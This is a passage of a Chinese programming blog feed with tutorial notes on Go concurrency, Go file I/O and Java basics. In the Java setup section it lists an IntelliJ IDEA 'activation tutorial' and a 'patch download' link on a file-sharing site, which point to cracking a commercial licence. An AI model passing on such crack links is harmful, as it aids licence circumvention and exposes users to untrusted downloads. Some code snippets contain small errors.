%d\n&quot;, statusCode)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="使用互斥锁实现同步-Mutex"><a href="#使用互斥锁实现同步-Mutex" class="headerlink" title="使用互斥锁实现同步 (Mutex)"></a>使用互斥锁实现同步 (Mutex)</h1><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>mu.Lock()</td><td>获取互斥锁，用于进入临界区。</td></tr><tr><td>mu.Unlock()</td><td>释放互斥锁，用于退出临界区。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;sync&quot;<br>)<br><br>var mu sync.Mutex<br><br>// 定义一个共享的计数器<br>var count int<br><br>func exampleFunc(id int, wg *sync.WaitGroup) &#123;<br>defer wg.Done() // 告诉等待组任务已完成<br><br>for i := 0; i &lt; 1000; i++ &#123;<br>mu.Lock()   // 获取互斥锁<br>count++     // 在临界区增加计数器的值<br>mu.Unlock() // 释放互斥锁<br>&#125;<br>&#125;<br><br>func main() &#123;<br>var wg sync.WaitGroup<br><br>// 启动多个goroutines<br>for i := 0; i &lt; 3; i++ &#123;<br>wg.Add(1) // 增加等待组计数<br>go exampleFunc(i, &amp;wg)<br>&#125;<br><br>// 等待所有goroutines完成<br>wg.Wait()<br><br>fmt.Printf(&quot;Final count value: %d\n&quot;, count)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="使用读写锁实现同步-RWMutex"><a href="#使用读写锁实现同步-RWMutex" class="headerlink" title="使用读写锁实现同步 (RWMutex)"></a>使用读写锁实现同步 (RWMutex)</h1><table><thead><tr><th>属性&#x2F;方法</th><th>描述</th></tr></thead><tbody><tr><td>rmu.RLock()</td><td>获取读锁，允许多个goroutines同时进行读操作，但阻止写操作。</td></tr><tr><td>rmu.RUnlock()</td><td>释放读锁，允许其他goroutines获取读锁或写锁。</td></tr><tr><td>rmu.Lock()</td><td>获取写锁，用于进入临界区并阻止其他goroutines的读和写操作。</td></tr><tr><td>rmu.Unlock()</td><td>释放写锁，允许其他goroutines获取读锁或写锁。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;sync&quot;<br>&quot;time&quot;<br>)<br><br>var rwmu sync.RWMutex<br>var sharedData int<br><br>func readData(id int, wg *sync.WaitGroup) &#123;<br>defer wg.Done()<br>rwmu.RLock()           // 获取读锁<br>defer rwmu.RUnlock()   // 释放读锁<br>fmt.Printf(&quot;Reader %d: %d\n&quot;, id, sharedData)<br>&#125;<br><br>func writeData(id int, wg *sync.WaitGroup) &#123;<br>defer wg.Done()<br>rwmu.Lock()           // 获取写锁<br>defer rwmu.Unlock()   // 释放写锁<br>sharedData = id<br>fmt.Printf(&quot;Writer %d wrote data\n&quot;, id)<br>&#125;<br><br>func main() &#123;<br>var wg sync.WaitGroup<br><br>// 启动多个读取goroutines<br>for i := 0; i &lt; 3; i++ &#123;<br>wg.Add(1)<br>go readData(i, &amp;wg)<br>&#125;<br><br>// 启动一个写入goroutine<br>wg.Add(1)<br>go writeData(42, &amp;wg)<br><br>wg.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>sync.RWMutex</code>是一个读写锁，允许多个goroutines同时读取共享资源，但只允许一个goroutine写入共享资源。</li><li><code>rwmu.RLock()</code>用于获取读锁，允许并发读取。</li><li><code>rwmu.Lock()</code>用于获取写锁，确保只有一个goroutine能够写入。</li></ul><h1 id="使用select语句选择操作"><a href="#使用select语句选择操作" class="headerlink" title="使用select语句选择操作"></a>使用<code>select</code>语句选择操作</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;time&quot;<br>)<br><br>func main() &#123;<br>// 创建两个整数类型的通道<br>ch1 := make(chan int)<br>ch2 := make(chan int)<br><br>// 启动一个goroutine发送数据到ch1<br>go func() &#123;<br>time.Sleep(1 * time.Second)<br>ch1 &lt;- 42<br>&#125;()<br><br>// 启动一个goroutine发送数据到ch2<br>go func() &#123;<br>time.Sleep(2 * time.Second)<br>ch2 &lt;- 23<br>&#125;()<br><br>// 使用select语句选择可用的操作<br>select &#123;<br>case value := &lt;-ch1:<br>fmt.Printf(&quot;Received from ch1: %d\n&quot;, value)<br>case value := &lt;-ch2:<br>fmt.Printf(&quot;Received from ch2: %d\n&quot;, value)<br>case &lt;-time.After(3 * time.Second):<br>fmt.Println(&quot;Timeout: No data received&quot;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个示例中，<code>select</code>语句等待<code>ch1</code>和<code>ch2</code>中的数据，选择其中一个首先准备好的操作，或者在超时后执行默认操作。<code>time.After</code>函数用于设置超时。这是Golang中用于处理多通道选择的常见模式。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 文件</title>
      <link href="/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/%E6%96%87%E4%BB%B6/"/>
      <url>/2022/05/20/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func Open(name string) (*File, error)<br>func OpenFile(name string, flag int, perm FileMode)<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>O_RDONLY</td><td>只读模式打开文件</td></tr><tr><td>O_WRONLY</td><td>只写模式打开文件</td></tr><tr><td>O_RDWR</td><td>读写模式打开文件</td></tr><tr><td>O_APPEND</td><td>写操作时将数据附加到文件尾部（追加）</td></tr><tr><td>O_CREATE</td><td>如果不存在将创建一个新文件</td></tr><tr><td>O_EXCL</td><td>和 O_CREATE 配合使用，文件必须不存在，否则返回一个错误</td></tr><tr><td>O_SYNC</td><td>当进行一系列写操作时，每次都要等待上次的 I&#x2F;O 操作完成再进行</td></tr><tr><td>O_TRUNC</td><td>如果可能，在打开时清空文件</td></tr></tbody></table><h1 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h1><h2 id="整个整个文件"><a href="#整个整个文件" class="headerlink" title="整个整个文件"></a>整个整个文件</h2><p>将文件整个读入内存。效率比较高，占用内存也最高</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>content,_ := ioutil.ReadFile(filePath)<br><br>fmt.Println(content)<br>fmt.Println(string(content))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="按行读取"><a href="#按行读取" class="headerlink" title="按行读取"></a>按行读取</h2><p>一般用于文件日志文件读取</p><h3 id="读取所有行"><a href="#读取所有行" class="headerlink" title="读取所有行"></a>读取所有行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>f,_ := os.Open(filePath)<br>defer f.Close()<br><br>fileScanner := bufio.NewScanner(f)<br><br>for fileScanner.Scan()&#123;<br>fmt.Println(fileScanner.Text())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读取指定行"><a href="#读取指定行" class="headerlink" title="读取指定行"></a>读取指定行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>f,_ := os.OpenFile(filePath, os.O_RDONLY, 0666)<br>defer f.Close()<br><br>stat,_ := f.Stat()<br>size := stat.Size()<br>fmt.Println(&quot;file size: &quot;, size)<br><br>buf := bufio.NewScanner(f)<br>lineCount := 1<br><br>for buf.Scan()&#123;<br>if lineCount == 3&#123;<br>fmt.Println(buf.Text())<br>&#125;<br>lineCount++<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="按字节读取"><a href="#按字节读取" class="headerlink" title="按字节读取"></a>按字节读取</h2><p>读取方式比较灵活，若文件较大，则可读取需要部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>f,_ := os.Open(filePath)<br>defer f.Close()<br><br>chunks := make([]byte, 0)<br>buf := make([]byte, 1024)<br><br>for &#123;<br>// 读取字节<br>n,_ := f.Read(buf)<br>fmt.Println(n)<br>if n == 0 &#123;<br>break<br>&#125;<br>chunks = append(chunks, buf[:n]...)<br>&#125;<br>fmt.Println(string(chunks))<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h1><h2 id="写入整个文件"><a href="#写入整个文件" class="headerlink" title="写入整个文件"></a>写入整个文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>content := []byte(&quot;123\n456\n789&quot;)<br><br>err := ioutil.WriteFile(filePath, content, 0644)<br>if err != nil &#123;panic(err)&#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>file,_ := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE, 0666)<br>defer file.Close()<br><br>// 写入文件时，使用带缓存的 *Writer<br>write := bufio.NewWriter(file)<br>for i:=1; i&lt;=5; i++&#123;<br>tmpText := &quot;test\n&quot;<br>write.WriteString(tmpText)<br>&#125;<br>// Flush将缓存的文件真正写入到文件中<br>write.Flush()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="在末尾追加"><a href="#在末尾追加" class="headerlink" title="在末尾追加"></a>在末尾追加</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func main()&#123;<br>filePath := &quot;./1.txt&quot;<br>file,_ := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE, 0666)<br>defer file.Close()<br><br>// 写入文件时，使用带缓存的 *Writer<br>write := bufio.NewWriter(file)<br>for i:=1; i&lt;=5; i++&#123;<br>tmpText := &quot;qqq\n&quot;<br>write.WriteString(tmpText)<br>&#125;<br>// Flush将缓存的文件真正写入到文件中<br>write.Flush()<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA</title>
      <link href="/2022/05/03/%E8%AF%AD%E8%A8%80/Java/java/"/>
      <url>/2022/05/03/%E8%AF%AD%E8%A8%80/Java/java/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>系统变量中新建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  变量名<br>JAVA_HOME<br>#  变量值（jdk 路径）<br>C:\Program Files\Java\jdk1.8.0_231<br></code></pre></td></tr></table></figure><p>系统变量的 Path 下新建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%JAVA_HOME%\bin<br></code></pre></td></tr></table></figure><h4 id="Burp-相关"><a href="#Burp-相关" class="headerlink" title="Burp 相关"></a>Burp 相关</h4><p>如光标错位</p><p>则将 <code>jdk/bin</code> 目录下的 <code>javaw.exe</code> 属性中的 <code>DPI缩放替代</code> 更改为 <code>系统</code> 或 <code>系统(增强)</code></p><h3 id="IntelliJ-IDEA"><a href="#IntelliJ-IDEA" class="headerlink" title="IntelliJ IDEA"></a>IntelliJ IDEA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://www.jetbrains.com/idea/download/#section=windows<br><br>#  激活教程<br>https://www.exception.site/essay/how-to-free-use-intellij-idea-2019-3<br># 补丁下载<br>https://wwe.lanzoul.com/ikV6Szw3mre<br><br></code></pre></td></tr></table></figure><h3 id="IntelliJ-IDEA-插件"><a href="#IntelliJ-IDEA-插件" class="headerlink" title="IntelliJ IDEA 插件"></a>IntelliJ IDEA 插件</h3><p>参考：<a href="https://mp.weixin.qq.com/s/Gq16D8a5vuo1YUYqHiQ1Lg">https://mp.weixin.qq.com/s/Gq16D8a5vuo1YUYqHiQ1Lg</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  中文语言包<br>Chinese (simplified) Language Pack<br>#  彩色括号（多个括号时会显示不同的颜色）<br>Rainbow Brackets<br>#  翻译插件<br>Translation<br>#  高亮显示括号的开始以及结尾<br>HighlightBracketPair<br>#  高亮显示控制台日志<br>Grep Console<br><br>Free Mybatis Tool<br></code></pre></td></tr></table></figure><h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><p>将 <code>.JAVA</code> 源文件编译成 <code>.class</code> 字节码文件，启动 <code>JVM虚拟机</code> 启动类加载器，寻找到 <code>.class</code> 文件并将其解析为 <code>二进制</code> 由操作系统执行</p><p><code>javac.exe</code>：编译工具</p><p><code>java.exe</code>：运行工具</p><p><code>JAVA</code>：源文件</p><p><code>class</code>：字节码文件</p><p><code>JDK</code>：<code>JAVA</code> 开发工具（包含 <code>JRE</code> 和开发工具）</p><p><code>JVM</code>：<code>JAVA</code> 虚拟机（跨平台）</p><p><code>JRE</code>：<code>JAVA</code> 运行环境（包含 <code>JVM</code> 和运行时所需的核心类库）</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>单行注释：<code>//test</code></p><p>多行注释：<code>/*test*/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class test&#123;//  定义 test 类<br>    public static void main(String[] args)<br>    &#123;<br>        System.out.println(&quot;test&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义<a href="https://www.runoob.com/java/java-basic-datatypes.html">数据类型</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  整数（当赋值为整数时，默认为 int 类型）<br>int<br>byte<br>short<br>long<br><br>#  浮点型（当赋值为整数时，默认为 dobule 类型）<br>float#  单精浮点（定义时需要在后面加上 f）<br>dobule#  双精浮点<br><br>#  字符型<br>char a#  字符型（ascii 码）<br><br>#  布尔型<br>boolean<br><br>#  字符串<br>String<br></code></pre></td></tr></table></figure><p>自动转换：数值标识范围小的数据类型可自动转换为范围大的数据类型</p><p>强制转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int a = (int)88.88<br></code></pre></td></tr></table></figure><p>算数表达式中包含多个基本数据类型的值的时候，整个算术表达式的类型会自动进行提升</p><ul><li><code>byte</code> 类型，<code>short</code> 类型和 <code>char</code> 类型将自动提升到 <code>int</code> 类型</li><li>整个表达式的类型自动提升到表达式中最高等级操作数相同的类型</li></ul><p>等级顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">byte, short, char  --&gt; int --&gt; long --&gt; float --&gt; double<br></code></pre></td></tr></table></figure><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  如果 a 大于 b 则返回 c 否则返回 d<br>a&gt;b?c:d;<br></code></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 获取数据类型<br>getType(test)<br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><table><thead><tr><th align="left"><strong>数据类型</strong></th><th align="left"><strong>默认值</strong></th></tr></thead><tbody><tr><td align="left">byte</td><td align="left">0</td></tr><tr><td align="left">short</td><td align="left">0</td></tr><tr><td align="left">int</td><td align="left">0</td></tr><tr><td align="left">long</td><td align="left">0L</td></tr><tr><td align="left">float</td><td align="left">0.0f</td></tr><tr><td align="left">double</td><td align="left">0.0d</td></tr><tr><td align="left">char</td><td align="left">‘u0000’</td></tr><tr><td align="left">String (or any object)</td><td align="left">null</td></tr><tr><td align="left">boolean</td><td align="left">false</td></tr></tbody></table><h1 id="常用包"><a href="#常用包" class="headerlink" title="常用包"></a>常用包</h1><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.util.Scanner;<br><br>public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        Scanner test = new Scanner(System.in);<br>        int a = test.nextInt();<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="随机"><a href="#随机" class="headerlink" title="随机"></a>随机</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.util.Random;<br><br>public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        Random r = new Random();<br><br>        System.out.println(r.nextInt(10));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">数据类型[] 数组名 = new 数组类型[数组长度];<br>String[] test = new String[10];<br><br>String[] test = &#123;&quot;数组0&quot;, &quot;数组1&quot;, &quot;数组2&quot;, &quot;数组3&quot;&#125;<br><br>// 打印所有数组元素<br>for (int element: myList) &#123;<br>    System.out.println(element);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ( 1 == 1 ) &#123;<br>    System.out.println(&quot;test_1&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="else"><a href="#else" class="headerlink" title="else"></a>else</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ( 1 == 1 ) &#123;<br>    System.out.println(&quot;test_1&quot;);<br>&#125; else &#123;<br>    System.out.println(&quot;test_2&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="else-if"><a href="#else-if" class="headerlink" title="else if"></a>else if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ( 1 == 1 ) &#123;<br>    System.out.println(&quot;test_1&quot;);<br>&#125; else if ( 2 == 2 ) &#123;<br>    System.out.println(&quot;test_2&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        int i = 1;<br>        switch (i)<br>        &#123;<br>            case 1:<br>                System.out.println(&quot;1&quot;);<br>                break;<br>            case 2:<br>                System.out.println(&quot;2&quot;);<br>                break;<br>            default:<br>                System.out.println(&quot;default&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三元运算"><a href="#三元运算" class="headerlink" title="三元运算"></a>三元运算</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        int i=1;<br>        int j=2;<br>        System.out.println(i&gt;j?111:222);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        for(int i=1; i&lt;=5; ++i)<br>        &#123;<br>            System.out.println(&quot;i = &quot; + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        int i = 0;<br>        while(true)<br>        &#123;<br>            if(i&gt;=5)&#123;break;&#125;<br>            ++i;<br>            System.out.println(&quot;i = &quot; + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h2><figure 